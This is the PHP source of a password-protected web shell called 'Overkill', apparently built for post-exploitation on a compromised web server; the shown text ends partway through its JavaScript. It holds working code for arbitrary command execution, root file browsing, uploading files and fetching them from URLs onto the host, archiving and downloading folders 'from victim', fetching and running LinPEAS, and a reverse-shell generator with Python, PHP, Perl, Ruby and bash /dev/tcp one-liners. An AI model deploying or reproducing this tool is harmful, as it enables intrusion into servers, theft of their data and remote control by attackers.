<?php
ob_start();
set_time_limit(0);  // Unlimited time
ini_set('memory_limit', '-1');  // Unlimited memory (be careful)
ini_set('output_buffering', 'off');
ini_set('zlib.output_compression', 0);
// while (ob_get_level())
//     ob_end_flush();
ob_implicit_flush(1);
error_reporting(E_ALL & ~E_WARNING);

// ?   PROTECTED LOGIN START
$MASTER_PASSWORD = 'yourStrongMasterPasswordHere';
$COOKIE_NAME = 'overkill_auth';
$COOKIE_TTL = time() + (86400 * 30);  // 30 days

// Handle login form submission
if (isset($_POST['master_password'])) {
    if ($_POST['master_password'] === $MASTER_PASSWORD) {
        setcookie($COOKIE_NAME, hash('sha256', $MASTER_PASSWORD), $COOKIE_TTL, '/', '', false, true);
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Invalid password.';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    setcookie($COOKIE_NAME, '', time() - 3600, '/', '', false, true);  // Expire the cookie
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Authentication check
$authenticated = false;
if (isset($_COOKIE[$COOKIE_NAME])) {
    if ($_COOKIE[$COOKIE_NAME] === hash('sha256', $MASTER_PASSWORD)) {
        $authenticated = true;
    }
}

// Show login form if not authenticated
if (!$authenticated) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - SQL WebShell</title>
        <style>
            body {
                background: #111;
                color: #eee;
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            form {
                background: #1a1a1a;
                padding: 20px;
                border-radius: 10px;
                border: 1px solid #333;
                width: 300px;
                box-sizing: border-box;
            }
            input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 10px;
                background: #222;
                color: #0f0;
                border: 1px solid #444;
                font-family: monospace;
                box-sizing: border-box;
            }
            button {
                width: 100%;
                padding: 10px;
                background: #333;
                color: #0f0;
                border: none;
                cursor: pointer;
                font-family: monospace;
            }
            button:hover {
                background: #0f0;
                color: #000;
            }
            .error {
                color: red;
                margin-bottom: 10px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <form method="POST" autocomplete="off">
            <h2 style="text-align:center;">Enter Master Password</h2>
            <?php if (!empty($login_error)): ?>
                <div class="error"><?php htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <input type="password" name="master_password" placeholder="Master Password" required autofocus />
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// !   PROTECTED LOGIN STOP

// ? FUNCTIONS START
function check_command_execution()
{
    /*
     * Checks what commands can be executed using PHP
     */
    $methods = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
    $available = array();

    // Get disabled functions from php.ini
    $disabled = explode(',', ini_get('disable_functions'));
    $disabled = array_map('trim', $disabled);

    foreach ($methods as $method) {
        if (function_exists($method) && is_callable($method) && !in_array($method, $disabled)) {
            $available[] = $method;
        }
    }
    return $available;
}

function execute_command($cmd, $available_methods)
{
    /*
     * Execute command using the available methods
     * $cmd -> string
     * $available_methods -> array OR string
     */
    $output = '';

    if (is_string($available_methods)) {
        $available_methods = array($available_methods);
    }

    foreach ($available_methods as $method) {
        switch ($method) {
            case 'shell_exec':
                $output = shell_exec($cmd);
                if ($output !== null)
                    return rtrim($output);
                break;

            case 'exec':
                $out = array();
                exec($cmd, $out);
                if (!empty($out))
                    return implode("\n", $out);
                break;

            case 'system':
                ob_start();
                system($cmd);
                $output = ob_get_clean();
                if (!empty($output))
                    return rtrim($output);
                break;

            case 'passthru':
                ob_start();
                passthru($cmd);
                $output = ob_get_clean();
                if (!empty($output))
                    return rtrim($output);
                break;

            case 'popen':
                $handle = popen($cmd, 'r');
                if ($handle) {
                    $output = '';
                    while (!feof($handle)) {
                        $output .= fread($handle, 1024);
                    }
                    pclose($handle);
                    if (!empty($output))
                        return rtrim($output);
                }
                break;
            case 'proc_open':
                $descriptorspec = array(
                    0 => array('pipe', 'r'),
                    1 => array('pipe', 'w'),
                    2 => array('pipe', 'w'),
                );

                $process = proc_open($cmd, $descriptorspec, $pipes);

                if (is_resource($process)) {
                    stream_set_blocking($pipes[1], false);
                    stream_set_blocking($pipes[2], false);

                    $output = '';
                    while (!feof($pipes[1]) || !feof($pipes[2])) {
                        $output .= fread($pipes[1], 1024);
                        $output .= fread($pipes[2], 1024);
                        flush();
                        usleep(100000);  // avoid 100% CPU usage
                    }

                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);

                    if (!empty($output))
                        return rtrim($output);
                }
                break;
        }
    }

    return 'All command execution methods failed or returned no output.';
}

function get_regex_version($command, $regex, $available_methods)
{
    if (empty($available_methods)) {
        return 'No execution';
    }

    // If it's an array, pick the first element; otherwise, use it as-is
    $method = is_array($available_methods) ? reset($available_methods) : $available_methods;

    $output = execute_command($command, $method);

    return preg_match($regex, $output, $m) ? $m[1] : 'X';
}

function check_install($command, $check = null, $available_methods = array())
{
    $method = is_array($available_methods) ? reset($available_methods) : $available_methods;

    $output = execute_command($command, $method);

    if ($check === null) {
        // If just checking execution status
        return $output !== null && trim($output) !== '' ? 'YES' : 'NO';
    }

    // Check if output contains the expected string
    return strpos($output, $check) !== false ? 'YES' : 'NO';
}

if (!function_exists('gethostname')) {
    function gethostname() {
        // Try php_uname first
        $hostname = php_uname('n');
        if ($hostname) {
            return $hostname;
        }

        // Fallback: shell command
        $hostname = trim(shell_exec('hostname'));
        if ($hostname) {
            return $hostname;
        }

        return 'unknown';
    }
}

function is_in_docker()
{
    $score = 0;
    $max_score = 6;

    // Strong signal: presence of .dockerenv
    if (file_exists('/.dockerenv')) {
        $score += 3;
    }

    // Medium signal: docker or containerd in cgroup
    if (
        is_readable('/proc/1/cgroup') &&
        preg_match('/docker|containerd/', file_get_contents('/proc/1/cgroup'))
    ) {
        $score += 2;
    }

    // Weak signal: hostname pattern
    $hostname = gethostname();
    if (preg_match('/^[0-9a-f]{12}$/', $hostname)) {
        $score += 1;
    }

    // Convert to percent
    $percent = intval(($score / $max_score) * 100);
    if ($percent < 25){
        $color = "#d7191c";
    }
    else if ($percent < 50){
        $color = "#fdae61";
    }
    else if ($percent < 75){
        $color = "#a6d96a";
    }
    else {
        $color = "#1a9641";
    }
    return "<button class='btn' disabled style='color: $color; margin: 0px; width: auto !important; font-weight: bold'>Shell&nbsp;In&nbsp;Docker&nbsp;Container&nbsp;Confidence:&nbsp;$percent%</button>";
}

function filter_dot_items($item) {
    return $item !== '.' && $item !== '..';
}

function listDirectory($path)
{
    $path = realpath($path);
    if (!$path || !is_dir($path))
        return;

    $items = @scandir($path);
    if (!$items)
        return;

    // Filter out '.' and '..' and reindex
    $items = array_values(array_filter($items, 'filter_dot_items'));

    echo '<ul>';

    $count = count($items);
    $isRoot = ($path === '/');

    foreach ($items as $index => $item) {
        $full = rtrim($path, '/') . '/' . $item;
        $safePath = htmlspecialchars($full, ENT_QUOTES);
        $safeName = htmlspecialchars($item);

        // Determine class for branch symbol, skip for root level
        $branchClass = '';
        if (!$isRoot) {
            $branchClass = ($index === $count - 1) ? 'last-item' : 'middle-item';
        }

        if (is_dir($full)) {
            echo '<li' . ($branchClass ? ' class="' . $branchClass . '"' : '') . '>';
            echo '<span class="folder" data-path="' . $safePath . '">' . $safeName . '</span><div class="nested"></div></li>';
        } else {
            echo '<li' . ($branchClass ? ' class="' . $branchClass . '"' : '') . '>';
            echo '<span class="file">' . $safeName . '</span></li>';
        }
    }
    echo '</ul>';
}

$open = isset($open) ? $open : false;

function ansi_to_html_callback($matches) {
    global $open;

    $codes = explode(';', $matches[1]);
    $styles = array();

    foreach ($codes as $code) {
        $code = intval($code);
        if ($code === 0) {
            $out = $open ? '</span>' : '';
            $open = false;
            return $out;
        }
        if ($code === 1)
            $styles[] = 'font-weight:bold';
        if ($code === 4)
            $styles[] = 'text-decoration:underline';
        if ($code >= 30 && $code <= 37) {
            $colors = array('black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white');
            $styles[] = 'color:' . $colors[$code - 30];
        }
        if ($code >= 90 && $code <= 97) {
            $colors = array('gray', 'lightcoral', 'lightgreen', 'lightyellow', 'lightblue', 'violet', 'lightcyan', 'white');
            $styles[] = 'color:' . $colors[$code - 90];
        }
        if ($code >= 40 && $code <= 47) {
            $bgColors = array('black', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white');
            $styles[] = 'background-color:' . $bgColors[$code - 40];
        }
    }

    if (!empty($styles)) {
        $out = $open ? '</span>' : '';
        $open = true;
        return $out . '<span style="' . implode(';', $styles) . '">';
    }

    return '';
}

function ansi_to_html($text)
{
    global $open;

    $text = htmlspecialchars($text);  // Avoid HTML injection

    $text = preg_replace_callback('/\x1b\[(.*?)m/', 'ansi_to_html_callback', $text);

    if ($open) {
        $text .= '</span>';  // close any remaining open tag
    }

    return $text;
}

// ! FUNCTIONS STOP

// ? VARIABLES START
$available_ce_methods = check_command_execution();
$services = array(
    'NetCat' => array(
        'status' => check_install('nc -h', 'connect to somewhere:', $available_ce_methods),
        'version' => get_regex_version('nc -h 2>&1', '/\[(v[^\]]+)\]/', $available_ce_methods)
    ),
    'SSH' => array(
        'status' => check_install('ssh', 'usage: ssh', $available_ce_methods),
        'version' => get_regex_version('ssh -V 2>&1', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
    ),
    'MySQL' => array(
        'status' => check_install('mysql --version', 'mysql from ', $available_ce_methods),
        'version' => get_regex_version('mysql --version 2>&1', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
    ),
    'MariaDB' => array(
        'status' => check_install('mariadb --version', 'mariadb from ', $available_ce_methods),
        'version' => get_regex_version('mariadb --version 2>&1', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
    ),
    'PostgreSQL' => array(
        'status' => check_install('psql --help', 'psql is the PostgreSQL', $available_ce_methods),
        'version' => get_regex_version('psql --version 2>&1', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
    ),
    'Python' => array(
        'status' => check_install('python --help', 'usage: python', $available_ce_methods),
        'version' => get_regex_version('python --version 2>&1', '/Python\s+([\d.]+)/', $available_ce_methods),
        'shell' => 'export RHOST="IP";export RP=PORT;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RP"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\''
    ),
    'PHP' => array(
        'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
        'version' => get_regex_version('php --version 2>&1', '/PHP\s+([\d\.]+)/', $available_ce_methods),
        'shell' => 'php -r \'$sock=fsockopen("IP",PORT);system("bash <&3 >&3 2>&3");\''
    ),
    'Perl' => array(
        'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
        'version' => get_regex_version('perl --version 2>&1', '/\(v([\d\.]+)\)/', $available_ce_methods),
        'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
    ),
    'Ruby' => array(
        'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
        'version' => get_regex_version('ruby --version 2>&1', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
        'shell' => 'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("IP",PORT))\''
    ),
    'bash' => array(
        'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
        'version' => get_regex_version('bash --version 2>&1', '/version\s+([\d\.]+)\(/', $available_ce_methods),
        'shell' => 'bash -i >& /dev/tcp/IP/PORT 0>&1'
    ),
    'cURL' => array(
        'status' => check_install('curl --help', 'Usage: curl', $available_ce_methods),
        'version' => get_regex_version('curl --version 2>&1', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
    ),
    'wget' => array(
        'status' => check_install('wget --help', 'Usage: wget', $available_ce_methods),
        'version' => get_regex_version('wget --version 2>&1', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
    ),
    'Docker' => array(
        'status' => check_install('docker --help', 'Usage:  docker', $available_ce_methods),
        'version' => get_regex_version('docker --version 2>&1', '/Docker version ([\d\.]+)/', $available_ce_methods)
    )
);

// ! VARIABLES STOP
// ? FUNCTIONALITIES START
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    if (is_dir($path)) {
        listDirectory($path);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && isset($_POST['uploadPath'])) {
    /* UPLOAD FILE FROM PC */
    header('Content-Type: application/json');

    $uploadPath = realpath($_POST['uploadPath']);
    if (!$uploadPath || !is_dir($uploadPath)) {
        echo json_encode(array('success' => false, 'error' => 'Invalid upload path'));
        exit;
    }

    $uploadFile = $_FILES['uploadFile'];

    if ($uploadFile['error'] !== UPLOAD_ERR_OK) {
        echo json_encode(array('success' => false, 'error' => 'Upload error code: ' . $uploadFile['error']));
        exit;
    }

    $filename = basename($uploadFile['name']);
    $destination = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

    if (move_uploaded_file($uploadFile['tmp_name'], $destination)) {
        echo json_encode(array('success' => true));
    } else {
        echo json_encode(array('success' => false, 'error' => 'Failed to move uploaded file'));
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' &&
        isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
    /* UPLOAD FILE WITH CURL */
    ob_start();
    header('Content-Type: application/json');

    $uploadPath = realpath($_GET['uploadPath']);
    if (!$uploadPath || !is_dir($uploadPath)) {
        echo json_encode(array('success' => false, 'error' => 'Invalid upload path'));
        exit;
    }

    if(!is_writable($uploadPath)){
        echo json_encode(array('success' => false, 'error' => 'Upload path not writable'));
        exit;
    }

    $url = $_GET['urlUpload'];
    $fileName = basename($_GET['urlUploadName']);
    $destination = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;

    // Initialize cURL to download the file
    $ch = curl_init($url);
    $fp = fopen($destination, 'wb');
    if (!$fp) {
        echo json_encode(array('success' => false, 'error' => "Failed to open destination file"));
        exit;
    }
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    $success = curl_exec($ch);
    $curlErr = curl_error($ch);
    curl_close($ch);
    fclose($fp);

    ob_clean();

    if ($success && file_exists($destination) && filesize($destination) > 0) {
        echo json_encode(array('success' => true));
    } else {
        // Remove incomplete file
        if (file_exists($destination))
            unlink($destination);
        echo json_encode(array('success' => false, 'error' => "Failed to download file: $curlErr"));
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['download'])) {
    /* DOWNLOAD FILE FROM VICTIM */

    $filePath = realpath($_GET['download']);

    // Optionally restrict base directory:
    $baseDir = realpath(__DIR__);  // or wherever your files live
    if (!$filePath || strpos($filePath, $baseDir) !== 0 || !is_file($filePath)) {
        http_response_code(404);
        echo 'File not found or access denied.';
        exit;
    }

    $filename = basename($filePath);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header("Content-Disposition: attachment; filename=\"$filename\"");
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filePath));

    readfile($filePath);
    exit;
}

if (isset($_GET['dump'])) {
    $path = realpath($_GET['dump']);

    if (!$path || !is_dir($path)) {
        http_response_code(400);
        exit('Invalid path');
    }

    $archiveName = basename($path) . '_' . time() . '.tar.gz';
    $archivePath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $archiveName;

    $escapedDir = escapeshellarg(dirname($path));
    $escapedBase = escapeshellarg(basename($path));
    $escapedOut = escapeshellarg($archivePath);

    $command = "cd $escapedDir && tar -czf $escapedOut $escapedBase";

    // Try all available methods to execute the archive command
    $result = execute_command($command, array('shell_exec', 'exec', 'system', 'passthru', 'popen'));

    // Validate archive creation
    if (!file_exists($archivePath)) {
        http_response_code(500);
        exit("Failed to create archive. Output:\n$result");
    }

    // Serve the archive
    header('Content-Type: application/gzip');
    header('Content-Disposition: attachment; filename="' . basename($archivePath) . '"');
    header('Content-Length: ' . filesize($archivePath));
    readfile($archivePath);

    // Clean up
    unlink($archivePath);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['exec_method'], $_POST['exec_path'])) {
    header('Content-Type: application/json');

    $cmd = $_POST['exec_cmd'];
    $method = $_POST['exec_method'];
    $path = $_POST['exec_path'];

    if (!in_array($method, $available_ce_methods)) {
        echo json_encode(array('success' => false, 'error' => 'Invalid execution method'));
        exit;
    }

    // Sanitize: ensure path exists and is a directory
    if (!is_dir($path)) {
        echo json_encode(array('success' => false, 'error' => 'Invalid path'));
        exit;
    }

    // Change working directory
    chdir($path);
    $output = execute_command($cmd, $method);
    $use_ansi = isset($_POST['use_ansi']) && $_POST['use_ansi'] === '1';
    if ($use_ansi){
        $output = ansi_to_html($output);
    }
    echo json_encode(array('success' => true, 'output' => $output));
    exit;
}
// ! FUNCTIONALITIES STOP

// ? DISPLAY FUNCTIONs START
// ! DISPLAY FUNCTIONS STOP

// ?   MAIN HTML START
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Overkill</title>
    <style>
        body {
            margin: 0;
            background: #111;
            color: #eee;
            font-family: monospace;
        }
        .grid {
            display: grid;
            grid-template-columns: calc(50vw - 0.25rem) calc(50vw - 0.25rem);
            grid-template-rows: 1fr 1fr 1fr 1fr;
            gap: 0.5rem;
            height: 100vh;
            box-sizing: border-box;
        }
        .card {
            background: #1a1a1a;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 10px;
            /* max-height: 25vh; */
            margin-top: 5px;
            margin-bottom: 5px;
        }
        input, select, textarea, button, a, .services {
            width: 100%;
            background: #222;
            color: #0f0;
            border: 1px solid #444;
            padding: 8px;
            box-sizing: border-box;
        }
        input[type="file"]{
            width: 300px !important;
        }
        .btn {
            background: #333;
            color: #0f0;
            cursor: pointer;
            width: 150px !important;
        }
        .btn:hover:not(:disabled) {
            background: #0f0;
            color: #000;
            width: 150px !important;
        }
        .btn-red{
            background: #333;
            color: #f00 !important;
            cursor: pointer;
            width: 150px !important;
        }
        .btn-red:hover:not(:disabled){
            background: #f00 !important;
            color: #000 !important;
            width: 150px !important;
        }
        .btn:disabled,.btn-red:disabled{
            background: #1a1a1a !important;
            width: 150px !important;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        th, td {
            border: 1px solid #666;
            padding: 5px;
        }
        .span-column {
            grid-column: span 2;
        }

        .span-row {
            grid-row: span 2;
            /* max-height: 50vh; */
        }
        .span-row-4 {
            grid-row: span 4;
        }

        .flex-row{
            display: inline-flex; 
            align-items: center;
            gap: 15px;
        }
        .flex-column{
            display: inline-flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 15px;
        }

        .error {
            color: red;
            margin-bottom: 10px;
            font-size: 0.9em;
        }

        #loading-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5em;
            color: #eee;
            user-select: none;
        }
        body.loading {
            pointer-events: none;
            user-select: none;
        }
        #result-content {
            overflow: auto;
            transform: rotateX(180deg);
        }
        #result-child-content {
            transform: rotateX(-180deg);
        }

        #file-tree-container {
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        #file-tree {
            overflow: auto;
            white-space: nowrap;
            flex: 1;
            margin: 0px;
        }
        ul {
            list-style-type: none;
            padding-left: 1em;
        }
        .folder {
            font-weight: bold;
            cursor: pointer;
            color: #4d90fe;
            padding: 2px 0px;
            border-radius: 4px;
            display: inline-block;
        }
        .file {
            cursor: pointer;
            color: white;
            padding: 2px 0px;
            border-radius: 4px;
            display: inline-block;
        }
        .nested {
            display: none;
        }
        .open > .nested {
            display: block;
        }
        .selected {
            border: 2px solid #4d90fe;
            background-color: #2a2a2a;
        }
        li.middle-item::before {
            content: "├ ";
            color: #888;
            font-family: monospace;
        }

        li.last-item::before {
            content: "└ ";
            color: #888;
            font-family: monospace;
        }

        #loading-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: hidden;
            align-items: center;
            justify-content: center;
            font-size: 1.5em;
            user-select: none;
        }
        #cmdOutput {
            background:black;
            color:white;
            padding: 1rem;
            flex-grow: 1;
            overflow-y: auto;
            margin-top: 10px;
            background: #111;
            border: 1px solid #333;
            border-radius: 4px;
            white-space: pre-wrap;
            font-size: 0.95em;
        }
    </style>
</head>
<body>
    <div id="loading-overlay" style="display:none;">Dumping folder... (This will take a long time. Go make some coffee or take a shit...)</div>
    <a class="btn-red" style="position:absolute; right:10px; top:0; width: 100px; text-align:center" href="?logout=True">Log&nbsp;Out</a>
    <div class="grid">
        <div  style="gap: 0px;align-items: stretch;" class="card span-row-4 flex-column">
            <div class="card">
                <div class="flex-row">
                    <label for="cmdMethod">Execute&nbsp;As:</label>
                    <select id="cmdMethod">
                    <?php foreach ($available_ce_methods as $method){
                        echo "<option value=" . htmlspecialchars($method) . ">" . htmlspecialchars($method) . "</option>";
                    } ?>
                    </select>
                    <label for="cmdInputColors">
                        ANSI&nbsp;Colors:
                    </label>
                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
                    <label>Quick&nbsp;Commands:</label>
                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1', true)">Run&nbsp;LinPEAS</button>
                    <?php echo is_in_docker(); ?>
                </div>
            </div>
            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
                <div class="flex-row" style="width: 100%">
                    <label style="text-wrap:nowrap" for="cmdInput">
                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
                    </label>
                    <input type="text" id="cmdInput" placeholder="Enter shell command">
                </div>
                <pre id="cmdOutput"></pre>
            </div>
        </div>
        <div class="card">
            <!-- Services, Auto Revshell Generator -->
            <div class="card">
                <h3>Reverse Shell</h3>
                <div class="flex-row">
                    <input id="revshell_ip" type="text" placeholder="IP:">
                    <input id="revshell_port" type="text" placeholder="PORT:">
                </div>
                <pre class="card" id="revshell" style="white-space:pre-wrap">Generate revshell by clicking on Services</pre>
            </div>
            <div class="card">
                <h3>Services</h3>
                <div class="flex-row" style="flex-wrap: wrap">
                    <?php
                    foreach ($services as $name => $service) {
                        $is_disabled = isset($service['status']) && $service['status'] === 'NO';
                        $has_shell = isset($service['shell']) && !empty($service['shell']);

                        // Determine class
                        $class = $is_disabled ? 'btn-red' : 'btn';

                        // Determine attributes
                        if ($is_disabled || !$has_shell) {
                            $attributes = 'disabled';
                        } else {
                            $escaped_shell = htmlspecialchars(addslashes($service['shell']));
                            $attributes = 'onclick="genShell(\'' . $escaped_shell . '\')"';
                        }
                        echo '<button class="' . $class . '" ' . $attributes . '>' . htmlspecialchars($name) . '&nbsp;:&nbsp;' . htmlspecialchars($service['version']) . '</button>' . PHP_EOL;
                    }
                    ?>
                </div>
            </div>
        </div>
        <div id="file-tree-container" class="card span-row">
            <h3>Folders And Files</h3>
            <ul id="file-tree">
                <li class="root-item"><span class="folder" data-path="/">/ (root)</span><div class="nested">
                <?php listDirectory('/'); ?>
            </ul>   
        </div>
        <div class="card">
            <div class="flex-column">
                <div class="flex-row" style="width: 100% !important">
                    <label>Selected&nbsp;Folder:</label>
                    <input disabled class="selectedPath" name="selectedPath" value="/">
                </div>
                <div class="flex-row">
                    <label for="uploadFileInput">Upload&nbsp;File:</label>
                    <input id="uploadFileInput" name="uploadFile" type="file">
                </div>
                <div class="flex-row">
                    <label for="urlUpload">URL&nbsp;Upload:</label>
                    <input id="urlUpload" type="text" placeholder="URL:">
                    <input id="urlUploadName" type="text" placeholder="File Name:">
                    <input id="urlUploadSubmit" class="btn" type="button" value="Submit">
                </div>
                <button class="btn" onclick="uploadFromUrl('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')">Upload&nbsp;LinPEAS</button>
                <button class="btn" id="dumpFolder">Dump&nbsp;Folder</button>
                <!-- <button class="btn">Clean&nbsp;Up</button> Still have to figure this one out -->
            </div>
        </div>
    </div>
</body>

<script>
    document.getElementById('cmdInput').addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            const cmd = this.value.trim();
            executeShellCommand(cmd);
            this.value = ''; // Clear input
        }
    });

    function executeShellCommand(cmd, linpeas) {
        if (!cmd.trim()) return;

        const cmdOutputEl = document.getElementById('cmdOutput');
        const method = document.getElementById('cmdMethod').value;
        const pathEl = document.getElementsByClassName('selectedPath')[0];
        const path = pathEl?.value || '/';
        const ansiColors = document.getElementById('cmdInputColors').checked;

        if (linpeas){
            cmdOutputEl.textContent = "[?] Starting Linpeas. This will take some time...\n" + cmdOutputEl.textContent;
        }

        // Handle 'clear' locally
        if (cmd === 'clear') {
            cmdOutputEl.textContent = '';
            return;
        }

        fetch(window.location.pathname, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                exec_cmd: cmd,
                exec_method: method,
                exec_path: path,
                use_ansi: ansiColors ? '1' : '0'
            })
        })
        .then(res => res.json())
        .then(data => {
            const timestamp = new Date().toLocaleTimeString();
            const output = data.success
                ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
                : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;

            if (linpeas){
                cmdOutputEl.textContent = "[*] File linpeas_out.txt created.\n" + cmdOutputEl.textContent;
            }
            else if (ansiColors) {
                cmdOutputEl.innerHTML = output + cmdOutputEl.innerHTML;
            } else {
                cmdOutputEl.textContent = output + cmdOutputEl.textContent;
            }
        })
        .catch(err => {
            const errorMsg = `\nError: ${err}\n`;
            if (ansiColors) {
                cmdOutputEl.innerHTML = errorMsg + cmdOutputEl.innerHTML;
            } else {
                cmdOutputEl.textContent = errorMsg + cmdOutputEl.textContent;
            }
        });
    }

    function refreshFolder(path, targetElement) {
        /* REFRESH FOLDER THAT IS CALLED */
        fetch('?path=' + encodeURIComponent(path))
            .then(response => response.text())
            .then(html => {
                targetElement.innerHTML = html;
            });
    }

    document.getElementById('uploadFileInput').addEventListener('change', function() {
        /* UPLOAD FILE FUNCTION */
        const fileInput = document.getElementById('uploadFileInput');
        const file = fileInput.files[0];
        if (!file) return;

        const selectedPath = document.getElementsByClassName('selectedPath')[0].value || '/';

        const formData = new FormData();
        formData.append('uploadFile', file);
        formData.append('uploadPath', selectedPath);

        fetch(window.location.pathname, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                alert('Upload successful!');
                fileInput.value = '';

                // Find the currently selected folder and its nested <ul> to refresh
                const selectedFolder = document.querySelector('.folder.selected');
                if (selectedFolder) {
                    const nested = selectedFolder.nextElementSibling;
                    if (nested) {
                        refreshFolder(selectedPath, nested);
                    }
                }
            } else {
                alert('Upload error: ' + data.error);
            }
        })
        .catch(err => {
            alert('Upload failed: ' + err.message);
        });
    });

    document.getElementById('file-tree').addEventListener('click', function (e) {
        if (e.target.classList.contains('folder')) {
            const el = e.target;
            const path = el.getAttribute('data-path');
            const parent = el.parentElement;

            // Deselect previous
            document.querySelectorAll('.folder.selected').forEach(f => f.classList.remove('selected'));
            el.classList.add('selected');
            selectedDir = path;
            Array.from(document.getElementsByClassName('selectedPath')).forEach(el => {
                el.value = path;
                el.textContent = path;
            });

            // Toggle display
            parent.classList.toggle('open');

            const nested = el.nextElementSibling;

            // Refresh folder view
            refreshFolder(path, nested);
        }
    });

    function genShell(shellTemplate) {
        const ip = document.getElementById('revshell_ip')?.value || '';
        const port = document.getElementById('revshell_port')?.value || '';
        const outputBlock = document.getElementById('revshell');

        if (!ip || !port) {
            alert("Please provide both IP and PORT.");
            return;
        }

        const finalShell = shellTemplate
            .replace(/IP/g, ip)
            .replace(/PORT/g, port);

        if (outputBlock) {
            outputBlock.textContent = finalShell;
        } else {
            console.warn('Output element with ID "revshell" not found.');
        }
    }

    function uploadFromUrl(customUrl = null, customName = null) {
        const url = customUrl || document.getElementById('urlUpload').value.trim();
        const fileName = customName || document.getElementById('urlUploadName').value.trim();
        const uploadPath = document.getElementsByClassName('selectedPath')[0]?.textContent.trim() || '/';
        
        if (!url || !fileName) {
            alert('Please enter both URL and file name.');
            return;
        }

        const params = new URLSearchParams({
            urlUpload: url,
            urlUploadName: fileName,
            uploadPath: uploadPath,
        });

        fetch(`${window.location.pathname}?${params.toString()}`, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        })
        .then(async res => res.json())
        .then(data => {
            if (data.success) {
                alert('URL upload successful!');
                // Clear inputs if used via UI
                if (!customUrl && !customName) {
                    document.getElementById('urlUpload').value = '';
                    document.getElementById('urlUploadName').value = '';
                }

                // Optionally refresh folder view
                const selectedFolder = document.querySelector('.folder.selected');
                if (selectedFolder) {
                    const nested = selectedFolder.nextElementSibling;
